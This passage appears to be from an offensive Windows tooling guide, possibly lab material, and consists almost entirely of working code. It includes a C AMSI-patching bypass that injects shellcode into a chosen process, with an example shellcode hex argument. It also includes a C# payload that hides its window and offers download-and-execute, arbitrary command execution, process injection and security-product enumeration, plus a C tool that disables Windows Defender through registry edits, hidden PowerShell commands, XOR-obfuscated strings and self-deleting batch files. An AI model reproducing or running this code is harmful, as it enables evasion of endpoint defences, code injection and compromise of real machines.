            printf("Usage: %s [options]\n", argv[0]);
            printf("Options:\n");
            printf("  --no-checks, -n    Skip anti-analysis checks (for VMs/testing)\n");
            printf("  --help, -h         Show this help message\n");
            return 0;
        }
    }

    printf("\n");

    if (BypassAmsiAdvanced()) {
        TestAmsiBypass();

        // Only show success messages if bypass actually worked
        if (g_bypass_active) {
            printf("\n=== BYPASS SUCCESSFUL ===\n");
            printf("[*] Bypass techniques used:\n");
            printf("    - Anti-analysis (debugger/sandbox/VM detection)%s\n",
                   g_skip_anti_analysis ? " [SKIPPED]" : "");
            printf("    - Ntdll unhooking to remove EDR instrumentation\n");
            printf("    - Hardware breakpoint bypass (stealth)\n");
            printf("    - Fallback memory patch with E_INVALIDARG\n");
            printf("\n[+] Ready for malicious script execution\n");
        } else {
            printf("\n=== BYPASS FAILED ===\n");
            printf("[-] AMSI is still active and blocking malicious content\n");
            printf("[-] The bypass techniques did not successfully disable AMSI\n");
            printf("\n[*] Possible reasons:\n");
            printf("    - Windows Defender or EDR detected and blocked the bypass\n");
            printf("    - Memory protection prevented patching\n");
            printf("    - AMSI has additional protections in this environment\n");
            printf("    - Hardware breakpoint was cleared by security software\n");
        }

    } else {
        printf("[-] AMSI bypass initialization failed\n");
        return 1;
    }

    if (g_hwbp_ctx.thread_handle) {
        RemoveVectoredExceptionHandler(HardwareBypassHandler);
    }

    return 0;
}
```

### 2. Native Code with Indirect Syscalls

the c file gets flagged, but binary works(as a task try to evade detection from static code analysis)

```c
// amsi_native_bypass.c
// Compile: cl /O2 /GS- src\amsi_native_bypass.c /Fe:bin\amsi_bypass.exe ntdll.lib advapi32.lib

#include <windows.h>
#include <stdio.h>
#include <amsi.h>
#include <tlhelp32.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "amsi.lib")

// XOR key for obfuscation
#define XOR_KEY 0xAA

// NT API declarations
typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

// Find syscall instruction in ntdll
PVOID FindSyscallInstruction() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return NULL;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)ntdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);

    // Find .text section
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sections[i].Name, ".text", 5) == 0) {
            BYTE* start = (BYTE*)ntdll + sections[i].VirtualAddress;
            DWORD size = sections[i].Misc.VirtualSize;

            // Search for syscall instruction (0x0F 0x05)
            for (DWORD j = 0; j < size - 1; j++) {
                if (start[j] == 0x0F && start[j + 1] == 0x05) {
                    printf("[+] Found syscall instruction at: 0x%p\n", &start[j]);
                    return &start[j];
                }
            }
        }
    }

    return NULL;
}

// Extract syscall number from function
DWORD GetSyscallNumber(PVOID function_address) {
    BYTE* func = (BYTE*)function_address;

    // Pattern: mov r10, rcx; mov eax, <syscall_number>
    // Bytes: 4C 8B D1 B8 XX XX XX XX
    for (int i = 0; i < 32; i++) {
        if (func[i] == 0xB8) {  // mov eax, imm32
            return *(DWORD*)&func[i + 1];
        }
    }

    return 0;
}

// Patch AMSI using NT API (more evasive than VirtualProtect)
BOOL PatchAmsiWithNtAPI() {
    printf("[*] Patching AMSI using NtProtectVirtualMemory...\n");

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        printf("[-] Failed to get ntdll handle\n");
        return FALSE;
    }

    NtProtectVirtualMemory_t pNtProtectVirtualMemory =
        (NtProtectVirtualMemory_t)GetProcAddress(ntdll, "NtProtectVirtualMemory");

    if (!pNtProtectVirtualMemory) {
        printf("[-] Failed to get NtProtectVirtualMemory\n");
        return FALSE;
    }

    DWORD ssn = GetSyscallNumber(pNtProtectVirtualMemory);
    if (ssn) {
        printf("[+] NtProtectVirtualMemory SSN: 0x%X\n", ssn);
    }

    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) {
        printf("[-] Failed to load amsi.dll\n");
        return FALSE;
    }

    PVOID amsi_scan_buffer = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!amsi_scan_buffer) {
        printf("[-] Failed to get AmsiScanBuffer\n");
        return FALSE;
    }

    printf("[+] AmsiScanBuffer at: 0x%p\n", amsi_scan_buffer);

    // Patch bytes: mov eax, 0x80070057 (E_INVALIDARG); ret
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    SIZE_T region_size = sizeof(patch);
    PVOID base_address = amsi_scan_buffer;
    ULONG old_protect = 0;

    // Use NtProtectVirtualMemory instead of VirtualProtect
    HANDLE current_process = (HANDLE)-1;
    NTSTATUS status = pNtProtectVirtualMemory(
        current_process,
        &base_address,
        &region_size,
        PAGE_EXECUTE_READWRITE,
        &old_protect
    );

    if (status != 0) {
        printf("[-] NtProtectVirtualMemory failed: 0x%X\n", status);
        return FALSE;
    }

    printf("[+] Memory protection changed to RWX\n");

    // Write patch
    memcpy(amsi_scan_buffer, patch, sizeof(patch));
    printf("[+] Patch written\n");

    // Restore protection
    status = pNtProtectVirtualMemory(
        current_process,
        &base_address,
        &region_size,
        old_protect,
        &old_protect
    );

    if (status == 0) {
        printf("[+] Memory protection restored\n");
    }

    return TRUE;
}


// Alternative: Patch via direct memory write (simpler)
BOOL PatchAmsiDirect() {
    printf("[*] Attempting direct AMSI patch...\n");

    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return FALSE;

    PVOID amsi_scan_buffer = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!amsi_scan_buffer) return FALSE;

    printf("[+] AmsiScanBuffer at: 0x%p\n", amsi_scan_buffer);

    DWORD old_protect;
    if (!VirtualProtect(amsi_scan_buffer, 16, PAGE_EXECUTE_READWRITE, &old_protect)) {
        printf("[-] VirtualProtect failed: %d\n", GetLastError());
        return FALSE;
    }

    // Patch: mov eax, 0x80070057; ret
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    memcpy(amsi_scan_buffer, patch, sizeof(patch));

    VirtualProtect(amsi_scan_buffer, 16, old_protect, &old_protect);

    printf("[+] Direct patch applied\n");
    return TRUE;
}

// Test if AMSI is bypassed
BOOL TestAmsiBypass() {
    printf("\n[*] Testing AMSI bypass...\n");

    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) {
        printf("[-] Failed to load amsi.dll\n");
        return FALSE;
    }

    typedef HRESULT (WINAPI* AmsiInitialize_t)(LPCWSTR, HAMSICONTEXT*);
    typedef HRESULT (WINAPI* AmsiScanBuffer_t)(HAMSICONTEXT, PVOID, ULONG, LPCWSTR, HAMSISESSION, AMSI_RESULT*);
    typedef void (WINAPI* AmsiUninitialize_t)(HAMSICONTEXT);

    AmsiInitialize_t pAmsiInitialize = (AmsiInitialize_t)GetProcAddress(amsi, "AmsiInitialize");
    AmsiScanBuffer_t pAmsiScanBuffer = (AmsiScanBuffer_t)GetProcAddress(amsi, "AmsiScanBuffer");
    AmsiUninitialize_t pAmsiUninitialize = (AmsiUninitialize_t)GetProcAddress(amsi, "AmsiUninitialize");

    if (!pAmsiInitialize || !pAmsiScanBuffer) {
        printf("[-] Failed to get AMSI functions\n");
        return FALSE;
    }

    HAMSICONTEXT ctx = NULL;
    HRESULT hr = pAmsiInitialize(L"TestApp", &ctx);
    if (FAILED(hr)) {
        printf("[-] AmsiInitialize failed: 0x%X\n", hr);
        return FALSE;
    }

    // Test with AMSI test sample
    const char* test_sample = "AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386";
    AMSI_RESULT result = AMSI_RESULT_CLEAN;

    hr = pAmsiScanBuffer(ctx, (PVOID)test_sample, (ULONG)strlen(test_sample),
                         L"TestSample", NULL, &result);

    printf("[*] AmsiScanBuffer returned: 0x%X\n", hr);
    printf("[*] Scan result: %d\n", result);

    if (hr == 0x80070057) {  // E_INVALIDARG
        printf("[+] BYPASS SUCCESSFUL - AMSI returned E_INVALIDARG\n");
        pAmsiUninitialize(ctx);
        return TRUE;
    } else if (result >= AMSI_RESULT_DETECTED) {
        printf("[-] BYPASS FAILED - AMSI detected malicious content\n");
        pAmsiUninitialize(ctx);
        return FALSE;
    } else {
        printf("[+] BYPASS SUCCESSFUL - Content not detected\n");
        pAmsiUninitialize(ctx);
        return TRUE;
    }
}

// Find process ID by name
DWORD FindProcessByName(const char* process_name) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create process snapshot\n");
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(snapshot, &pe32)) {
        CloseHandle(snapshot);
        return 0;
    }

    DWORD pid = 0;
    do {
        if (_stricmp(pe32.szExeFile, process_name) == 0) {
            pid = pe32.th32ProcessID;
            printf("[+] Found %s with PID: %d\n", process_name, pid);
            break;
        }
    } while (Process32Next(snapshot, &pe32));

    CloseHandle(snapshot);
    return pid;
}

// Convert hex string to bytes
unsigned char* HexToBytes(const char* hex_string, size_t* out_len) {
    size_t len = strlen(hex_string);
    if (len % 2 != 0) {
        printf("[-] Invalid hex string (odd length)\n");
        return NULL;
    }

    size_t byte_len = len / 2;
    unsigned char* bytes = (unsigned char*)malloc(byte_len);
    if (!bytes) {
        printf("[-] Memory allocation failed\n");
        return NULL;
    }

    for (size_t i = 0; i < byte_len; i++) {
        char byte_str[3] = { hex_string[i * 2], hex_string[i * 2 + 1], '\0' };
        bytes[i] = (unsigned char)strtol(byte_str, NULL, 16);
    }

    *out_len = byte_len;
    return bytes;
}

// Inject shellcode into target process
BOOL InjectPayload(DWORD pid, unsigned char* payload, size_t payload_size) {
    printf("\n[*] Injecting payload into PID %d...\n", pid);
    printf("[+] Payload size: %zu bytes\n", payload_size);

    // Open target process
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) {
        printf("[-] Failed to open process: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] Process handle obtained\n");

    // Allocate memory in target
    PVOID remoteBuf = VirtualAllocEx(hProc, NULL, payload_size,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!remoteBuf) {
        printf("[-] VirtualAllocEx failed: %d\n", GetLastError());
        CloseHandle(hProc);
        return FALSE;
    }

    printf("[+] Allocated memory at: 0x%p\n", remoteBuf);

    // Write payload
    SIZE_T written = 0;
    if (!WriteProcessMemory(hProc, remoteBuf, payload, payload_size, &written)) {
        printf("[-] WriteProcessMemory failed: %d\n", GetLastError());
        VirtualFreeEx(hProc, remoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }

    printf("[+] Wrote %zu bytes\n", written);

    // Execute via remote thread
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
                                       (LPTHREAD_START_ROUTINE)remoteBuf,
                                       NULL, 0, NULL);

    if (!hThread) {
        printf("[-] CreateRemoteThread failed: %d\n", GetLastError());
        VirtualFreeEx(hProc, remoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }

    printf("[+] Remote thread created\n");
    printf("[+] Payload injected successfully!\n");

    WaitForSingleObject(hThread, 2000);

    CloseHandle(hThread);
    CloseHandle(hProc);

    return TRUE;
}

int main(int argc, char* argv[]) {
    // Check arguments
    if (argc < 3) {
        printf("Usage: %s <process_name> <shellcode_hex>\n", argv[0]);
        return 1;
    }

    const char* target_process = argv[1];
    const char* shellcode_hex = argv[2];

    // Convert hex shellcode to bytes
    size_t payload_size = 0;
    unsigned char* payload = HexToBytes(shellcode_hex, &payload_size);
    if (!payload) {
        printf("[-] Failed to parse shellcode\n");
        return 1;
    }

    printf("[+] Shellcode parsed: %zu bytes\n\n", payload_size);

    // Step 1: Bypass AMSI
    printf("[*] Step 1: Bypassing AMSI...\n");
    BOOL amsi_bypassed = PatchAmsiWithNtAPI();
    if (!amsi_bypassed) {
        printf("[*] Falling back to direct method...\n");
        amsi_bypassed = PatchAmsiDirect();
    }

    if (!amsi_bypassed) {
        printf("[-] AMSI bypass failed\n");
        free(payload);
        return 1;
    }

    // Verify AMSI bypass
    if (!TestAmsiBypass()) {
        printf("[-] AMSI bypass verification failed\n");
        free(payload);
        return 1;
    }

    printf("\n[+] AMSI successfully bypassed!\n");

    // Step 2: Find target process
    printf("\n[*] Step 2: Finding target process '%s'...\n", target_process);
    DWORD pid = FindProcessByName(target_process);

    if (pid == 0) {
        printf("[-] Process '%s' not found\n", target_process);
        printf("[*] Make sure the process is running\n");
        free(payload);
        return 1;
    }

    // Step 3: Inject payload
    printf("\n[*] Step 3: Injecting payload...\n");
    if (!InjectPayload(pid, payload, payload_size)) {
        printf("[-] Payload injection failed\n");
        free(payload);
        return 1;
    }

    printf("\n[+] All steps completed successfully!\n");
    free(payload);

    return 0;
}
```

**Compile and Run:**

```bash
# Compile
cl /O2 /GS- src\amsi_native_bypass.c /Fe:bin\amsi_bypass.exe ntdll.lib advapi32.lib

# Usage
.\bin\amsi_bypass.exe <process_name> <shellcode_hex>

.\bin\amsi_bypass.exe notepad.exe 505152535657556a605a6863616c6354594883ec2865488b32488b7618488b761048ad488b30488b7e3003573c8b5c17288b741f204801fe8b541f240fb72c178d5202ad813c0757696e4575ef8b741f1c4801fe8b34ae4801f799ffd74883c4305d5f5e5b5a5958c3
```

### 3. Compiled C# Assemblies (Execute-Assembly)

```csharp
// ExecuteAssemblyPayload.cs
// Compile: csc /target:exe /out:payload.exe ExecuteAssemblyPayload.cs

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace AmsiBypass
{
    class ExecuteAssemblyPayload
    {
        // P/Invoke declarations for advanced operations
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static void Main(string[] args)
        {
            // Hide console window for stealth
            IntPtr handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            Console.WriteLine("[*] Execute-Assembly Payload - AMSI Bypass Demo");
            Console.WriteLine("[*] This code runs without AMSI scanning\n");

            if (args.Length > 0)
            {
                switch (args[0].ToLower())
                {
                    case "enum":
                        EnumerateSystem();
                        break;
                    case "download":
                        if (args.Length > 1)
                            DownloadAndExecute(args[1]);
                        else
                            Console.WriteLine("[-] Usage: payload.exe download <url>");
                        break;
                    case "exec":
                        if (args.Length > 1)
                            ExecuteCommand(string.Join(" ", args, 1, args.Length - 1));
                        else
                            Console.WriteLine("[-] Usage: payload.exe exec <command>");
                        break;
                    case "inject":
                        if (args.Length > 2)
                            InjectShellcode(args[1], args[2]);
                        else
                            Console.WriteLine("[-] Usage: payload.exe inject <pid> <shellcode_hex>");
                        break;
                    default:
                        ShowUsage();
                        break;
                }
            }
            else
            {
                ShowUsage();
            }

            // Show window again before exit
            ShowWindow(handle, SW_SHOW);
        }

        static void ShowUsage()
        {
            Console.WriteLine("Usage:");
            Console.WriteLine("  payload.exe enum              - Enumerate system information");
            Console.WriteLine("  payload.exe download <url>    - Download and execute payload");
            Console.WriteLine("  payload.exe exec <command>    - Execute command");
            Console.WriteLine("  payload.exe inject <pid> <sc> - Inject shellcode into process");
            Console.WriteLine("\nNote: This bypasses AMSI because it's compiled .NET code");
        }

        static void EnumerateSystem()
        {
            Console.WriteLine("[*] System Enumeration (AMSI-free)\n");

            // Computer info
            Console.WriteLine($"[+] Computer Name: {Environment.MachineName}");
            Console.WriteLine($"[+] User Name: {Environment.UserName}");
            Console.WriteLine($"[+] Domain: {Environment.UserDomainName}");
            Console.WriteLine($"[+] OS Version: {Environment.OSVersion}");
            Console.WriteLine($"[+] 64-bit OS: {Environment.Is64BitOperatingSystem}");
            Console.WriteLine($"[+] 64-bit Process: {Environment.Is64BitProcess}");
            Console.WriteLine($"[+] Processor Count: {Environment.ProcessorCount}");
            Console.WriteLine($"[+] CLR Version: {Environment.Version}");

            // Check privileges
            Console.WriteLine($"\n[*] Checking Privileges:");
            var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            var principal = new System.Security.Principal.WindowsPrincipal(identity);
            bool isAdmin = principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
            Console.WriteLine($"[+] Running as Administrator: {isAdmin}");
            Console.WriteLine($"[+] User SID: {identity.User}");

            // Network info
            Console.WriteLine($"\n[*] Network Information:");
            try
            {
                string hostName = Dns.GetHostName();
                IPHostEntry hostEntry = Dns.GetHostEntry(hostName);
                foreach (IPAddress ip in hostEntry.AddressList)
                {
                    if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        Console.WriteLine($"[+] IP Address: {ip}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Network enum error: {ex.Message}");
            }

            // Running processes (high-value targets)
            Console.WriteLine($"\n[*] High-Value Processes:");
            string[] targetProcesses = { "lsass", "explorer", "winlogon", "services", "svchost" };
            foreach (var proc in Process.GetProcesses())
            {
                foreach (var target in targetProcesses)
                {
                    if (proc.ProcessName.ToLower().Contains(target))
                    {
                        try
                        {
                            Console.WriteLine($"[+] {proc.ProcessName} (PID: {proc.Id})");
                        }
                        catch { }
                    }
                }
            }

            // AV/EDR detection
            Console.WriteLine($"\n[*] Security Product Detection:");
            string[] securityProcesses = { "MsMpEng", "MsSense", "SenseCncProxy", "SenseIR",
                                          "CrowdStrike", "CsFalcon", "CSAgent", "elastic-agent",
                                          "elastic-endpoint", "SentinelAgent", "SentinelOne" };
            bool foundSecurity = false;
            foreach (var proc in Process.GetProcesses())
            {
                foreach (var secProc in securityProcesses)
                {
                    if (proc.ProcessName.ToLower().Contains(secProc.ToLower()))
                    {
                        Console.WriteLine($"[!] Detected: {proc.ProcessName}");
                        foundSecurity = true;
                    }
                }
            }
            if (!foundSecurity)
            {
                Console.WriteLine("[+] No common security products detected");
            }
        }

        static void ExecuteCommand(string command)
        {
            Console.WriteLine($"[*] Executing: {command}\n");

            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c {command}",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (Process process = Process.Start(psi))
                {
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();

                    if (!string.IsNullOrEmpty(output))
                    {
                        Console.WriteLine("[+] Output:");
                        Console.WriteLine(output);
                    }

                    if (!string.IsNullOrEmpty(error))
                    {
                        Console.WriteLine("[-] Error:");
                        Console.WriteLine(error);
                    }

                    Console.WriteLine($"\n[*] Exit Code: {process.ExitCode}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Execution failed: {ex.Message}");
            }
        }

        static void DownloadAndExecute(string url)
        {
            Console.WriteLine($"[*] Downloading from: {url}");

            try
            {
                using (WebClient client = new WebClient())
                {
                    // Add user agent to avoid basic detection
                    client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

                    byte[] data = client.DownloadData(url);
                    Console.WriteLine($"[+] Downloaded {data.Length} bytes");

                    // Determine file type and execute appropriately
                    if (url.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
                    {
                        string tempPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName() + ".exe");
                        File.WriteAllBytes(tempPath, data);
                        Console.WriteLine($"[*] Saved to: {tempPath}");
                        Console.WriteLine("[*] Executing...");

                        Process.Start(tempPath);
                        Console.WriteLine("[+] Execution started");
                    }
                    else if (url.EndsWith(".dll", StringComparison.OrdinalIgnoreCase))
                    {
                        Console.WriteLine("[*] Loading .NET assembly from memory...");
                        System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(data);

                        // Try to find and invoke entry point
                        var entryPoint = assembly.EntryPoint;
                        if (entryPoint != null)
                        {
                            Console.WriteLine($"[+] Found entry point: {entryPoint.Name}");
                            entryPoint.Invoke(null, new object[] { new string[] { } });
                        }
                        else
                        {
                            Console.WriteLine("[-] No entry point found in assembly");
                        }
                    }
                    else
                    {
                        // Assume it's a script or text payload
                        string content = Encoding.UTF8.GetString(data);
                        Console.WriteLine("[+] Downloaded content:");
                        Console.WriteLine(content);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Download/Execute failed: {ex.Message}");
            }
        }

        static void InjectShellcode(string pidStr, string shellcodeHex)
        {
            Console.WriteLine("[*] Shellcode Injection (AMSI-free)");

            try
            {
                int pid = int.Parse(pidStr);
                byte[] shellcode = HexStringToByteArray(shellcodeHex);

                Console.WriteLine($"[*] Target PID: {pid}");
                Console.WriteLine($"[*] Shellcode size: {shellcode.Length} bytes");

                // P/Invoke for injection
                IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
                if (hProcess == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to open process");
                    return;
                }

                IntPtr allocMem = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length,
                                                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                if (allocMem == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to allocate memory");
                    CloseHandle(hProcess);
                    return;
                }

                Console.WriteLine($"[+] Allocated memory at: 0x{allocMem.ToInt64():X}");

                IntPtr bytesWritten;
                if (!WriteProcessMemory(hProcess, allocMem, shellcode, (uint)shellcode.Length, out bytesWritten))
                {
                    Console.WriteLine("[-] Failed to write shellcode");
                    VirtualFreeEx(hProcess, allocMem, 0, MEM_RELEASE);
                    CloseHandle(hProcess);
                    return;
                }

                Console.WriteLine($"[+] Wrote {bytesWritten} bytes");

                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocMem, IntPtr.Zero, 0, IntPtr.Zero);
                if (hThread == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to create remote thread");
                    VirtualFreeEx(hProcess, allocMem, 0, MEM_RELEASE);
                    CloseHandle(hProcess);
                    return;
                }

                Console.WriteLine("[+] Remote thread created successfully");
                Console.WriteLine("[+] Shellcode injection complete");

                CloseHandle(hThread);
                CloseHandle(hProcess);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Injection failed: {ex.Message}");
            }
        }

        static byte[] HexStringToByteArray(string hex)
        {
            hex = hex.Replace(" ", "").Replace("0x", "").Replace(",", "");
            byte[] bytes = new byte[hex.Length / 2];
            for (int i = 0; i < bytes.Length; i++)
            {
                bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            }
            return bytes;
        }

        // P/Invoke declarations for injection
        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint dwFreeType);

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr hObject);

        const int PROCESS_ALL_ACCESS = 0x1F0FFF;
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint MEM_RELEASE = 0x8000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
    }
}
```

```c
// defender_stealth.c
// Compile: cl /O2 /GS- src\defender_stealth.c /Fe:bin\defender_stealth.exe advapi32.lib
// Requires Administrator privileges

#include <windows.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "advapi32.lib")

// XOR obfuscation for strings
void xor_decrypt(char* str, int len, char key) {
    for (int i = 0; i < len; i++) {
        str[i] ^= key;
    }
}

// Obfuscated strings (XOR with 0x42)
char reg_path1[] = {0x34, 0x2f, 0x24, 0x36, 0x30, 0x21, 0x34, 0x27, 0x5c, 0x30, 0x29, 0x21, 0x2d, 0x33, 0x2b, 0x37, 0x2e, 0x36, 0x5c, 0x30, 0x29, 0x21, 0x2d, 0x33, 0x2b, 0x37, 0x2e, 0x36, 0x5c, 0x30, 0x29, 0x2d, 0x2d, 0x2b, 0x31, 0x37, 0x5c, 0x30, 0x29, 0x2e, 0x2c, 0x2b, 0x31, 0x37, 0x5c, 0x24, 0x27, 0x28, 0x27, 0x2e, 0x26, 0x27, 0x32, 0x5c, 0x34, 0x27, 0x21, 0x2c, 0x6e, 0x36, 0x29, 0x2d, 0x27, 0x5c, 0x30, 0x32, 0x2b, 0x36, 0x27, 0x21, 0x36, 0x29, 0x2b, 0x2e, 0x00};

// Check if running as administrator
BOOL IsElevated() {
    BOOL elevated = FALSE;
    HANDLE token = NULL;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation;
        DWORD size = sizeof(TOKEN_ELEVATION);

        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size)) {
            elevated = elevation.TokenIsElevated;
        }
        CloseHandle(token);
    }

    return elevated;
}

// Indirect PowerShell execution to avoid detection
BOOL ExecuteStealthCommand(const char* cmd) {
    // Create a batch file to execute the command
    char batch_path[MAX_PATH];
    GetTempPathA(MAX_PATH, batch_path);
    strcat_s(batch_path, MAX_PATH, "tmp.bat");

    FILE* f;
    if (fopen_s(&f, batch_path, "w") == 0) {
        fprintf(f, "@echo off\n");
        fprintf(f, "%s\n", cmd);
        fprintf(f, "del \"%%~f0\"\n");  // Self-delete
        fclose(f);

        // Execute batch file hidden
        STARTUPINFOA si = {sizeof(si)};
        PROCESS_INFORMATION pi;
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        if (CreateProcessA(NULL, batch_path, NULL, NULL, FALSE,
                          CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, 5000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return TRUE;
        }
    }

    return FALSE;
}

// Disable via registry (obfuscated)
BOOL DisableViaRegistry() {
    printf("[*] Applying configuration changes...\n");

    HKEY hKey;
    DWORD value = 1;

    // Path 1: Real-Time Protection
    const char* paths[] = {
        "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection",
        "SOFTWARE\\Policies\\Microsoft\\Windows Defender",
        "SOFTWARE\\Microsoft\\Windows Defender\\Features"
    };

    const char* values1[] = {
        "DisableRealtimeMonitoring",
        "DisableBehaviorMonitoring",
        "DisableOnAccessProtection",
        "DisableScanOnRealtimeEnable"
    };

    const char* values2[] = {
        "DisableAntiSpyware",
        "DisableAntiVirus"
    };

    // Set Real-Time Protection keys
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, paths[0], 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

        for (int i = 0; i < 4; i++) {
            RegSetValueExA(hKey, values1[i], 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        }
        RegCloseKey(hKey);
    }

    // Set Defender keys
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, paths[1], 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

        for (int i = 0; i < 2; i++) {
            RegSetValueExA(hKey, values2[i], 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        }
        RegCloseKey(hKey);
    }

    printf("[+] Configuration applied\n");
    return TRUE;
}

// Disable via PowerShell (indirect)
BOOL DisableViaPowerShell() {
    printf("[*] Executing configuration commands...\n");

    // Build commands that are less suspicious
    const char* commands[] = {
        "powershell -w hidden -c \"Set-MpPreference -DisableRealtimeMonitoring 1\"",
        "powershell -w hidden -c \"Set-MpPreference -DisableBehaviorMonitoring 1\"",
        "powershell -w hidden -c \"Set-MpPreference -DisableIOAVProtection 1\"",
        "powershell -w hidden -c \"Set-MpPreference -DisableScriptScanning 1\"",
        "powershell -w hidden -c \"Set-MpPreference -MAPSReporting 0\"",
        "powershell -w hidden -c \"Set-MpPreference -SubmitSamplesConsent 2\"",
        "powershell -w hidden -c \"Add-MpPreference -ExclusionPath 'C:\\Windows_Mitigations_Lab'\"",
        "powershell -w hidden -c \"Add-MpPreference -ExclusionProcess 'payload.exe'\""
    };

    for (int i = 0; i < 8; i++) {
        ExecuteStealthCommand(commands[i]);
        Sleep(100);  // Small delay between commands
    }

    printf("[+] Commands executed\n");
    return TRUE;
}

int main(int argc, char* argv[]) {
    // Minimal output to avoid detection
    if (!IsElevated()) {
        printf("[-] Administrator privileges required\n");
        return 1;
    }

    printf("[*] Security Configuration Tool\n");
    printf("[*] Modifying system settings...\n\n");

    // Use both methods
    DisableViaRegistry();
    Sleep(500);
    DisableViaPowerShell();

